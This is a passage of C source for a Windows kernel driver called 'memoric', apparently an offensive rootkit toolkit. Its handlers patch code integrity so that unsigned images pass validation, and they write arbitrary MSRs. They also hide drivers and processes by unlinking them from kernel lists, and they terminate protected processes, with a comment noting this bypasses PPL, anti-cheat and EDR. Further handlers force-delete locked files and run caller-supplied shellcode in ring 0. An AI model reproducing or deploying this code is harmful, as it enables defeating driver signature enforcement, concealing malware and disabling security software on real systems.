        /* Restore PTE to read-only */
        __try {
            *(volatile ULONG64*)pteAddr = g_CiFuncOrigPte;
            __invlpg(ciAddr);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            /* Non-critical */
        }
        break;
    }

    case MEMORIC_CI_FUNC_RESTORE: {
        ULONG64 pteAddr, pteValue;

        if (!g_CiFuncSaved || !g_CiFuncPatched) {
            DbgPrint("[memoric] CiFuncPatch: Nothing to restore\n");
            break;
        }

        st = ResolvePteBase();
        if (!NT_SUCCESS(st)) break;

        pteAddr = GetPteAddress((ULONG64)(ULONG_PTR)ciAddr);
        __try {
            pteValue = *(volatile ULONG64*)pteAddr;
            *(volatile ULONG64*)pteAddr = pteValue | 2ULL;
            __invlpg(ciAddr);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            break;
        }

        __try {
            RtlCopyMemory(ciAddr, g_CiFuncOrigBytes, 4);
            g_CiFuncPatched = FALSE;
            resp->Success = 1;
            resp->Patched = 0;
            DbgPrint("[memoric] CiFuncPatch: CiValidateImageHeader restored\n");
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] CiFuncPatch: Restore write failed\n");
        }

        /* Restore PTE */
        __try {
            *(volatile ULONG64*)pteAddr = g_CiFuncOrigPte;
            __invlpg(ciAddr);
        } __except (EXCEPTION_EXECUTE_HANDLER) { }
        break;
    }

    case MEMORIC_CI_FUNC_QUERY:
        resp->Success = 1;
        resp->Patched = g_CiFuncPatched ? 1 : 0;
        __try {
            RtlCopyMemory(resp->CurrentBytes, ciAddr, sizeof(resp->CurrentBytes));
        } __except (EXCEPTION_EXECUTE_HANDLER) { }
        if (g_CiFuncSaved) {
            RtlCopyMemory(resp->OriginalBytes, g_CiFuncOrigBytes, sizeof(resp->OriginalBytes));
        }
        break;

    default:
        DbgPrint("[memoric] CiFuncPatch: Unknown action %lu\n", reqCopy.Action);
        break;
    }

    *bytesReturned = sizeof(MEMORIC_CI_FUNC_PATCH_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * CI Callback Patch — Replace SeCiCallbacks entry in ntoskrnl.
 *
 * ntoskrnl!SeCiCallbacks is a structure containing function pointers
 * that CI.dll registers. By replacing the CiValidateImageHeader pointer
 * with ZwFlushInstructionCache (which always returns STATUS_SUCCESS),
 * all image validation is bypassed.
 *
 * Approach:
 *   1. Find CiValidateImageHeader address via MmGetSystemRoutineAddress
 *   2. Find ntoskrnl .data section
 *   3. Scan for QWORD matching CiValidateImageHeader address
 *   4. Also find ZwFlushInstructionCache address
 *   5. Replace the pointer using PTE-based write
 * ================================================================ */

static ULONG64 g_SeCiCallbacksEntry = 0;   /* Address of the pointer in SeCiCallbacks */
static ULONG64 g_OrigCallbackPtr = 0;       /* Original pointer value */
static BOOLEAN g_CiCallbackPatched = FALSE;

static NTSTATUS HandleCiCallbackPatch(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_CI_CALLBACK_REQUEST reqCopy;
    PMEMORIC_CI_CALLBACK_RESPONSE resp;
    UNICODE_STRING funcName;
    PVOID ciValidateAddr, zwFlushAddr;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_CI_CALLBACK_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_CI_CALLBACK_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_CI_CALLBACK_REQUEST));
    resp = (PMEMORIC_CI_CALLBACK_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_CI_CALLBACK_RESPONSE));

    /* Find CiValidateImageHeader */
    RtlInitUnicodeString(&funcName, L"CiValidateImageHeader");
    ciValidateAddr = MmGetSystemRoutineAddress(&funcName);
    if (!ciValidateAddr) {
        DbgPrint("[memoric] CiCallback: CiValidateImageHeader not found\n");
        *bytesReturned = sizeof(MEMORIC_CI_CALLBACK_RESPONSE);
        return STATUS_SUCCESS;
    }

    /* Find ZwFlushInstructionCache */
    RtlInitUnicodeString(&funcName, L"ZwFlushInstructionCache");
    zwFlushAddr = MmGetSystemRoutineAddress(&funcName);
    if (!zwFlushAddr) {
        DbgPrint("[memoric] CiCallback: ZwFlushInstructionCache not found\n");
        *bytesReturned = sizeof(MEMORIC_CI_CALLBACK_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->ZwFlushAddr = (ULONG64)(ULONG_PTR)zwFlushAddr;

    switch (reqCopy.Action) {
    case MEMORIC_CI_CALLBACK_PATCH: {
        PVOID ntBase = NULL;
        ULONG ntSize = 0;
        PIMAGE_NT_HEADERS64 ntHdr;
        PIMAGE_SECTION_HEADER sec;
        ULONG i, j;
        ULONG64 ciValAddr = (ULONG64)(ULONG_PTR)ciValidateAddr;
        BOOLEAN found = FALSE;

        /* Resolve PTE base for writing */
        st = ResolvePteBase();
        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] CiCallback: PTE resolution failed\n");
            break;
        }

        st = FindKernelModule("ntoskrnl.exe", &ntBase, &ntSize);
        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] CiCallback: Cannot find ntoskrnl\n");
            break;
        }

        ntHdr = RtlImageNtHeader(ntBase);
        if (!ntHdr) break;

        sec = IMAGE_FIRST_SECTION(ntHdr);
        for (i = 0; i < ntHdr->FileHeader.NumberOfSections && !found; i++, sec++) {
            PUCHAR secStart;
            ULONG secSize;

            /* SeCiCallbacks lives in a data section (.data or ALMOSTRO or similar) */
            if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)
                continue;
            if (!(sec->Characteristics & IMAGE_SCN_MEM_READ))
                continue;

            secStart = (PUCHAR)ntBase + sec->VirtualAddress;
            secSize = sec->Misc.VirtualSize;

            if ((ULONG_PTR)secStart < 0xFFFF000000000000ULL)
                continue;

            /* Scan for QWORD matching CiValidateImageHeader address */
            for (j = 0; j + sizeof(ULONG64) <= secSize; j += sizeof(ULONG64)) {
                __try {
                    ULONG64 val = *(PULONG64)(secStart + j);
                    if (val == ciValAddr) {
                        g_SeCiCallbacksEntry = (ULONG64)(ULONG_PTR)(secStart + j);
                        g_OrigCallbackPtr = val;

                        /* Replace with ZwFlushInstructionCache */
                        {
                            ULONG64 pteAddr = GetPteAddress(g_SeCiCallbacksEntry);
                            ULONG64 pteValue;

                            pteValue = *(volatile ULONG64*)pteAddr;

                            /* Make writable */
                            *(volatile ULONG64*)pteAddr = pteValue | 2ULL;
                            __invlpg((PVOID)(ULONG_PTR)g_SeCiCallbacksEntry);

                            /* Overwrite the pointer */
                            *(volatile ULONG64*)(secStart + j) = (ULONG64)(ULONG_PTR)zwFlushAddr;

                            /* Restore PTE */
                            *(volatile ULONG64*)pteAddr = pteValue;
                            __invlpg((PVOID)(ULONG_PTR)g_SeCiCallbacksEntry);
                        }

                        g_CiCallbackPatched = TRUE;
                        resp->Success = 1;
                        resp->Patched = 1;
                        resp->SeCiCallbacksAddr = g_SeCiCallbacksEntry;
                        resp->OriginalPtr = g_OrigCallbackPtr;
                        resp->CurrentPtr = (ULONG64)(ULONG_PTR)zwFlushAddr;
                        found = TRUE;

                        DbgPrint("[memoric] CiCallback: Replaced CiValidateImageHeader ptr at %p: 0x%llX -> 0x%llX (ZwFlushInstructionCache)\n",
                                 secStart + j, ciValAddr, (ULONG64)(ULONG_PTR)zwFlushAddr);
                        break;
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    continue;
                }
            }
        }

        if (!found) {
            DbgPrint("[memoric] CiCallback: CiValidateImageHeader pointer not found in ntoskrnl data sections\n");
        }
        break;
    }

    case MEMORIC_CI_CALLBACK_RESTORE: {
        if (!g_CiCallbackPatched || g_SeCiCallbacksEntry == 0) {
            DbgPrint("[memoric] CiCallback: Nothing to restore\n");
            break;
        }

        st = ResolvePteBase();
        if (!NT_SUCCESS(st)) break;

        __try {
            ULONG64 pteAddr = GetPteAddress(g_SeCiCallbacksEntry);
            ULONG64 pteValue = *(volatile ULONG64*)pteAddr;

            *(volatile ULONG64*)pteAddr = pteValue | 2ULL;
            __invlpg((PVOID)(ULONG_PTR)g_SeCiCallbacksEntry);

            *(volatile ULONG64*)g_SeCiCallbacksEntry = g_OrigCallbackPtr;

            *(volatile ULONG64*)pteAddr = pteValue;
            __invlpg((PVOID)(ULONG_PTR)g_SeCiCallbacksEntry);

            g_CiCallbackPatched = FALSE;
            resp->Success = 1;
            resp->Patched = 0;
            resp->SeCiCallbacksAddr = g_SeCiCallbacksEntry;
            resp->OriginalPtr = g_OrigCallbackPtr;
            resp->CurrentPtr = g_OrigCallbackPtr;

            DbgPrint("[memoric] CiCallback: Restored original pointer at %p\n",
                     (PVOID)(ULONG_PTR)g_SeCiCallbacksEntry);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] CiCallback: Restore failed\n");
        }
        break;
    }

    case MEMORIC_CI_CALLBACK_QUERY: {
        resp->Success = 1;
        resp->Patched = g_CiCallbackPatched ? 1 : 0;
        resp->SeCiCallbacksAddr = g_SeCiCallbacksEntry;
        resp->OriginalPtr = g_OrigCallbackPtr;
        resp->ZwFlushAddr = (ULONG64)(ULONG_PTR)zwFlushAddr;

        if (g_SeCiCallbacksEntry != 0) {
            __try {
                resp->CurrentPtr = *(volatile ULONG64*)g_SeCiCallbacksEntry;
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                resp->CurrentPtr = 0;
            }
        }
        break;
    }

    default:
        DbgPrint("[memoric] CiCallback: Unknown action %lu\n", reqCopy.Action);
        break;
    }

    *bytesReturned = sizeof(MEMORIC_CI_CALLBACK_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * MSR Read/Write — rdmsr / wrmsr arbitrary Model Specific Registers.
 *
 * Key MSRs:
 *   0xC0000082 (IA32_LSTAR) — syscall entry point
 *   0xC0000080 (IA32_EFER)  — extended feature enables
 *   0x1D9 (IA32_DEBUGCTL)   — debug control
 *   0x174-0x176 (SYSENTER)  — legacy syscall
 * ================================================================ */

static NTSTATUS HandleMsrRW(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_MSR_REQUEST reqCopy;
    PMEMORIC_MSR_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_MSR_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_MSR_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_MSR_REQUEST));
    resp = (PMEMORIC_MSR_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_MSR_RESPONSE));
    resp->MsrIndex = reqCopy.MsrIndex;

    switch (reqCopy.Action) {
    case MEMORIC_MSR_READ:
        __try {
            resp->Value = __readmsr(reqCopy.MsrIndex);
            resp->Success = 1;
            DbgPrint("[memoric] MSR: Read MSR 0x%X = 0x%llX\n", reqCopy.MsrIndex, resp->Value);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] MSR: Read MSR 0x%X failed (exception)\n", reqCopy.MsrIndex);
        }
        break;

    case MEMORIC_MSR_WRITE: {
        KIRQL oldIrql;
        __try {
            resp->OldValue = __readmsr(reqCopy.MsrIndex);
            KeRaiseIrql(HIGH_LEVEL, &oldIrql);
            __writemsr(reqCopy.MsrIndex, reqCopy.Value);
            KeLowerIrql(oldIrql);
            resp->Value = reqCopy.Value;
            resp->Success = 1;
            DbgPrint("[memoric] MSR: Write MSR 0x%X: 0x%llX -> 0x%llX\n",
                     reqCopy.MsrIndex, resp->OldValue, resp->Value);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] MSR: Write MSR 0x%X failed (exception)\n", reqCopy.MsrIndex);
        }
        break;
    }

    default:
        DbgPrint("[memoric] MSR: Unknown action %lu\n", reqCopy.Action);
        break;
    }

    *bytesReturned = sizeof(MEMORIC_MSR_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Driver Cloak — Unlink driver from PsLoadedModuleList via DKOM.
 * 
 * Every loaded driver has a KLDR_DATA_TABLE_ENTRY stored in
 * DriverObject->DriverSection. The InLoadOrderLinks field is a
 * LIST_ENTRY in PsLoadedModuleList. Unlinking hides from all
 * standard driver enumeration.
 * ================================================================ */

static BOOLEAN g_SelfCloaked = FALSE;

static NTSTATUS HandleDriverCloak(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_DRIVER_CLOAK_REQUEST reqCopy;
    PMEMORIC_DRIVER_CLOAK_RESPONSE resp;
    PDRIVER_OBJECT targetDriver = NULL;
    UNICODE_STRING driverName;
    WCHAR driverPath[128];

    if (inputLength < sizeof(MEMORIC_DRIVER_CLOAK_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_DRIVER_CLOAK_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_DRIVER_CLOAK_REQUEST));
    resp = (PMEMORIC_DRIVER_CLOAK_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_DRIVER_CLOAK_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_CLOAK_SELF:
        /* Cloak our own driver */
        if (!g_DeviceObject || !g_DeviceObject->DriverObject) {
            DbgPrint("[memoric] Cloak: No device object\n");
            break;
        }
        targetDriver = g_DeviceObject->DriverObject;
        break;

    case MEMORIC_CLOAK_TARGET: {
        NTSTATUS st;
        reqCopy.DriverName[63] = L'\0';

        /* Build driver path: \Driver\<name> */
        {
            UNICODE_STRING prefix, suffix;
            RtlInitUnicodeString(&prefix, L"\\Driver\\");
            RtlInitUnicodeString(&suffix, reqCopy.DriverName);
            RtlZeroMemory(driverPath, sizeof(driverPath));
            RtlCopyMemory(driverPath, prefix.Buffer, prefix.Length);
            RtlCopyMemory((PUCHAR)driverPath + prefix.Length, suffix.Buffer, suffix.Length);
        }
        RtlInitUnicodeString(&driverName, driverPath);

        st = ObReferenceObjectByName(
            &driverName,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&targetDriver
        );

        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] Cloak: Cannot find driver %ws: 0x%08X\n", reqCopy.DriverName, st);
            break;
        }
        break;
    }

    case MEMORIC_CLOAK_QUERY:
        resp->Success = 1;
        resp->Cloaked = g_SelfCloaked;
        *bytesReturned = sizeof(MEMORIC_DRIVER_CLOAK_RESPONSE);
        return STATUS_SUCCESS;

    default:
        DbgPrint("[memoric] Cloak: Unknown action %lu\n", reqCopy.Action);
        *bytesReturned = sizeof(MEMORIC_DRIVER_CLOAK_RESPONSE);
        return STATUS_SUCCESS;
    }

    if (targetDriver) {
        /* Get LDR_DATA_TABLE_ENTRY from DriverSection */
        PVOID driverSection = targetDriver->DriverSection;
        if (driverSection) {
            /* InLoadOrderLinks is at offset 0 of KLDR_DATA_TABLE_ENTRY */
            PLIST_ENTRY entry = (PLIST_ENTRY)driverSection;
            KIRQL oldIrql;

            resp->DriverObjectAddr = (ULONG64)(ULONG_PTR)targetDriver;
            resp->DriverSectionAddr = (ULONG64)(ULONG_PTR)driverSection;

            /* Raise IRQL and unlink */
            KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);

            /* Validate list entry integrity */
            if (entry->Flink && entry->Blink &&
                (ULONG_PTR)entry->Flink > 0xFFFF000000000000ULL &&
                (ULONG_PTR)entry->Blink > 0xFFFF000000000000ULL) {

                /* Classic DKOM unlink */
                entry->Blink->Flink = entry->Flink;
                entry->Flink->Blink = entry->Blink;

                /* Self-reference to prevent stale pointer crashes */
                entry->Flink = entry;
                entry->Blink = entry;

                resp->Success = 1;
                resp->Cloaked = 1;
                resp->EntriesRemoved = 1;

                if (reqCopy.Action == MEMORIC_CLOAK_SELF)
                    g_SelfCloaked = TRUE;

                DbgPrint("[memoric] Cloak: Driver unlinked from PsLoadedModuleList\n");
            } else {
                DbgPrint("[memoric] Cloak: Invalid list entry pointers\n");
            }

            KeLowerIrql(oldIrql);
        } else {
            DbgPrint("[memoric] Cloak: DriverSection is NULL\n");
        }

        /* Dereference if we referenced via ObReferenceObjectByName */
        if (reqCopy.Action == MEMORIC_CLOAK_TARGET)
            ObDereferenceObject(targetDriver);
    }

    *bytesReturned = sizeof(MEMORIC_DRIVER_CLOAK_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Force Kill — Terminate any process from kernel, bypassing all
 * protections including PPL, anti-cheat, EDR etc.
 *
 * Methods:
 * 1. ZwTerminateProcess: opens handle via ZwOpenProcess in kernel
 *    mode (unlimited access) then terminates.
 * 2. DKOM: unlinks EPROCESS from ActiveProcessLinks (process
 *    becomes invisible but threads continue briefly).
 * 3. Thread kill: terminates all threads individually via
 *    PsTerminateSystemThread / KeInsertQueueApc poison.
 * ================================================================ */

static NTSTATUS HandleForceKill(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_FORCE_KILL_REQUEST reqCopy;
    PMEMORIC_FORCE_KILL_RESPONSE resp;
    PEPROCESS process = NULL;
    NTSTATUS st;
    HANDLE hProcess = NULL;

    if (inputLength < sizeof(MEMORIC_FORCE_KILL_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_FORCE_KILL_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_FORCE_KILL_REQUEST));
    resp = (PMEMORIC_FORCE_KILL_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_FORCE_KILL_RESPONSE));
    resp->ProcessId = reqCopy.ProcessId;

    if (reqCopy.ProcessId == 0 || reqCopy.ProcessId == 4) {
        DbgPrint("[memoric] ForceKill: Refusing to kill System/Idle\n");
        *bytesReturned = sizeof(MEMORIC_FORCE_KILL_RESPONSE);
        return STATUS_SUCCESS;
    }

    /* Lookup EPROCESS */
    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] ForceKill: PID %lu not found: 0x%08X\n", reqCopy.ProcessId, st);
        *bytesReturned = sizeof(MEMORIC_FORCE_KILL_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->EprocessAddr = (ULONG64)(ULONG_PTR)process;

    switch (reqCopy.Action) {
    case MEMORIC_KILL_TERMINATE: {
        /* Method 1: ZwOpenProcess + ZwTerminateProcess from kernel mode.
           Kernel-mode callers get PROCESS_ALL_ACCESS regardless of PPL. */
        OBJECT_ATTRIBUTES oa;
        CLIENT_ID cid;

        cid.UniqueProcess = (HANDLE)(ULONG_PTR)reqCopy.ProcessId;
        cid.UniqueThread = NULL;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

        st = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
        if (NT_SUCCESS(st)) {
            st = ZwTerminateProcess(hProcess, reqCopy.ExitCode);
            ZwClose(hProcess);

            if (NT_SUCCESS(st)) {
                resp->Success = 1;
                resp->Method = 0;
                DbgPrint("[memoric] ForceKill: PID %lu terminated via ZwTerminateProcess\n",
                         reqCopy.ProcessId);
            } else {
                DbgPrint("[memoric] ForceKill: ZwTerminateProcess failed: 0x%08X\n", st);
            }
        } else {
            DbgPrint("[memoric] ForceKill: ZwOpenProcess failed: 0x%08X\n", st);
        }
        break;
    }

    case MEMORIC_KILL_DKOM: {
        /* Method 2: DKOM — unlink from ActiveProcessLinks. */
        if (g_Offsets.Resolved && g_Offsets.ActiveProcessLinks != 0) {
            PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)process + g_Offsets.ActiveProcessLinks);
            KIRQL oldIrql;

            KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);

            if (links->Flink && links->Blink &&
                (ULONG_PTR)links->Flink > 0xFFFF000000000000ULL) {
                links->Blink->Flink = links->Flink;
                links->Flink->Blink = links->Blink;
                links->Flink = links;
                links->Blink = links;
                resp->Success = 1;
                resp->Method = 1;
                DbgPrint("[memoric] ForceKill: PID %lu DKOM unlinked\n", reqCopy.ProcessId);
            }

            KeLowerIrql(oldIrql);
        } else {
            DbgPrint("[memoric] ForceKill: EPROCESS offsets not resolved\n");
        }
        break;
    }

    case MEMORIC_KILL_THREAD_KILL: {
        /* Method 3: Force-terminate by killing all threads */
        OBJECT_ATTRIBUTES oa;
        CLIENT_ID cid;

        cid.UniqueProcess = (HANDLE)(ULONG_PTR)reqCopy.ProcessId;
        cid.UniqueThread = NULL;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

        st = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
        if (NT_SUCCESS(st)) {
            /* Suspend then terminate — more reliable for stubborn processes */
            /* First try suspending */
            typedef NTSTATUS(*PNtSuspendProcess)(HANDLE);
            UNICODE_STRING funcName;
            PNtSuspendProcess pSuspend;

            RtlInitUnicodeString(&funcName, L"ZwSuspendProcess");
            pSuspend = (PNtSuspendProcess)MmGetSystemRoutineAddress(&funcName);
            if (pSuspend) {
                pSuspend(hProcess);
            }

            st = ZwTerminateProcess(hProcess, reqCopy.ExitCode);
            ZwClose(hProcess);

            if (NT_SUCCESS(st)) {
                resp->Success = 1;
                resp->Method = 2;
                DbgPrint("[memoric] ForceKill: PID %lu killed (suspend+terminate)\n", reqCopy.ProcessId);
            }
        }
        break;
    }

    default:
        DbgPrint("[memoric] ForceKill: Unknown action %lu\n", reqCopy.Action);
        break;
    }

    ObDereferenceObject(process);
    *bytesReturned = sizeof(MEMORIC_FORCE_KILL_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Force Delete — Delete locked/protected files from kernel.
 *
 * Uses ZwSetInformationFile with FileDispositionInformation to
 * delete files that are locked by user-mode processes. The kernel
 * caller bypasses sharing violations.
 * ================================================================ */

static NTSTATUS HandleForceDelete(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_FORCE_DELETE_REQUEST reqCopy;
    PMEMORIC_FORCE_DELETE_RESPONSE resp;
    UNICODE_STRING filePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_FORCE_DELETE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_FORCE_DELETE_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_FORCE_DELETE_REQUEST));
    resp = (PMEMORIC_FORCE_DELETE_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_FORCE_DELETE_RESPONSE));

    reqCopy.FilePath[259] = L'\0';
    RtlInitUnicodeString(&filePath, reqCopy.FilePath);
    InitializeObjectAttributes(&oa, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    /* Open with DELETE access. Force sharing for locked files. */
    st = ZwCreateFile(
        &hFile,
        DELETE | SYNCHRONIZE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
        NULL, 0
    );

    if (!NT_SUCCESS(st)) {
        /* Second attempt: try without FILE_DELETE_ON_CLOSE, use manual disposition */
        st = ZwCreateFile(
            &hFile,
            DELETE | SYNCHRONIZE,
            &oa,
            &iosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );
    }

    if (NT_SUCCESS(st)) {
        FILE_DISPOSITION_INFORMATION dispInfo;
        dispInfo.DeleteFile = TRUE;

        st = ZwSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), FileDispositionInformation);

        resp->NtStatus = (ULONG64)st;
        if (NT_SUCCESS(st)) {
            resp->Success = 1;
            DbgPrint("[memoric] ForceDelete: %wZ marked for deletion\n", &filePath);
        } else {
            DbgPrint("[memoric] ForceDelete: SetInformation failed: 0x%08X\n", st);
        }

        ZwClose(hFile);
    } else {
        resp->NtStatus = (ULONG64)st;
        DbgPrint("[memoric] ForceDelete: Cannot open %wZ: 0x%08X\n", &filePath, st);
    }

    *bytesReturned = sizeof(MEMORIC_FORCE_DELETE_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * System Thread — Create kernel-mode system threads.
 * Thread runs at PASSIVE_LEVEL with System process context.
 * ================================================================ */

static HANDLE g_SystemThreadHandles[8] = { 0 };
static ULONG g_SystemThreadCount = 0;

static NTSTATUS HandleSystemThread(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_SYSTEM_THREAD_REQUEST reqCopy;
    PMEMORIC_SYSTEM_THREAD_RESPONSE resp;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_SYSTEM_THREAD_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_SYSTEM_THREAD_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_SYSTEM_THREAD_REQUEST));
    resp = (PMEMORIC_SYSTEM_THREAD_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_SYSTEM_THREAD_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_THREAD_CREATE: {
        HANDLE threadHandle = NULL;

        if (reqCopy.StartAddress == 0) {
            DbgPrint("[memoric] SystemThread: NULL start address\n");
            break;
        }

        /* Validate start address is in kernel space */
        if (reqCopy.StartAddress < 0xFFFF000000000000ULL) {
            DbgPrint("[memoric] SystemThread: Start address not in kernel space\n");
            break;
        }

        st = PsCreateSystemThread(
            &threadHandle,
            THREAD_ALL_ACCESS,
            NULL,
            NULL,     /* System process */
            NULL,
            (PKSTART_ROUTINE)reqCopy.StartAddress,
            (PVOID)reqCopy.Context
        );

        if (NT_SUCCESS(st)) {
            resp->Success = 1;
            resp->ThreadHandle = (ULONG64)(ULONG_PTR)threadHandle;

            /* Store handle for cleanup */
            if (g_SystemThreadCount < 8) {
                g_SystemThreadHandles[g_SystemThreadCount++] = threadHandle;
            }

            DbgPrint("[memoric] SystemThread: Created thread at 0x%llX (handle=%p)\n",
                     reqCopy.StartAddress, threadHandle);
        } else {
            DbgPrint("[memoric] SystemThread: PsCreateSystemThread failed: 0x%08X\n", st);
        }
        break;
    }

    case MEMORIC_THREAD_QUERY:
        resp->Success = 1;
        resp->ThreadHandle = g_SystemThreadCount;
        break;

    default:
        break;
    }

    *bytesReturned = sizeof(MEMORIC_SYSTEM_THREAD_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Kernel Exec — Allocate nonpaged pool, copy shellcode, and execute
 * it in ring-0 context. Full arbitrary kernel code execution.
 *
 * The shellcode runs at PASSIVE_LEVEL and must return (ULONG64).
 * Shellcode buffer follows MEMORIC_KERNEL_EXEC_REQUEST in the IOCTL.
 * ================================================================ */

typedef ULONG64 (*KERNEL_SHELLCODE_FN)(VOID);

static PVOID g_KernelAllocations[16] = { 0 };
static ULONG g_KernelAllocSizes[16] = { 0 };
static ULONG g_KernelAllocCount = 0;

static NTSTATUS HandleKernelExec(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    PMEMORIC_KERNEL_EXEC_REQUEST req;
    PMEMORIC_KERNEL_EXEC_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_KERNEL_EXEC_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_KERNEL_EXEC_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_KERNEL_EXEC_REQUEST)systemBuffer;

    /* Save request fields before overwriting with response */
    ULONG action = req->Action;
    ULONG scSize = req->ShellcodeSize;
    ULONG64 allocAddr = req->AllocatedAddress;

    resp = (PMEMORIC_KERNEL_EXEC_RESPONSE)systemBuffer;

    switch (action) {
    case MEMORIC_EXEC_RUN: {
        PVOID pool;
        PUCHAR shellcodeData;
        ULONG64 retVal;

        if (scSize == 0 || scSize > 64 * 1024) {
            DbgPrint("[memoric] KernelExec: Invalid shellcode size %lu\n", scSize);
            break;
        }

        if (inputLength < sizeof(MEMORIC_KERNEL_EXEC_REQUEST) + scSize) {
            DbgPrint("[memoric] KernelExec: Input buffer too small for shellcode\n");
            break;
        }

        shellcodeData = (PUCHAR)systemBuffer + sizeof(MEMORIC_KERNEL_EXEC_REQUEST);

        /* Allocate executable nonpaged pool */
        pool = ExAllocatePoolWithTag(NonPagedPoolExecute, scSize, MEMORIC_POOL_TAG);
        if (!pool) {
            DbgPrint("[memoric] KernelExec: Pool allocation failed\n");
            break;
        }

        /* Copy shellcode */
        RtlCopyMemory(pool, shellcodeData, scSize);

